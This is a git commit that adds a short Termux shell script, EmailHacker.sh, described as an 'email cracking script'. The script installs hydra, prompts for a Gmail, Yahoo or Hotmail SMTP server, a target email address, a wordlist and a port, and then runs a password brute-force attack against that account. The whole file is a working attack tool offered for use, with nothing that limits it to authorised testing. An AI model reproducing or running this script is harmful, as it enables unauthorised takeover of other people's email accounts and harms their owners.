ea96f6ef4f495489f6324c4365f85f4793279acb
Cyb3r3x3r <32600126+Cyb3r3x3r@users.noreply.github.com>
2018-01-15 01:37:41 +0530

    Add files via upload

---
+++ EmailHacker.sh
@@ -0,0 +1,19 @@
+
+
+echo Simple Email Cracking Script in Termux
+echo Written By: Cyb3r3x3r
+echo Installing hydra.....
+echo Be patient if you have installed already..
+pkg install hydra -y
+echo NOTE: Make sure you have wordlists!
+echo Let us Begin:
+echo Choose a SMTP service: Gmail = smtp.gmail.com / Yahoo = smtp.mail.yahoo.com / Hotmail = smtp.live.com /:
+read smtp
+echo Enter Email Address:
+read email
+echo Provide Directory of Wordlist for Passwords:
+read wordlist
+echo Enter Port:
+read port
+
+hydra -S -l $email -P $wordlist -e ns -V -s $port $smtp smtp
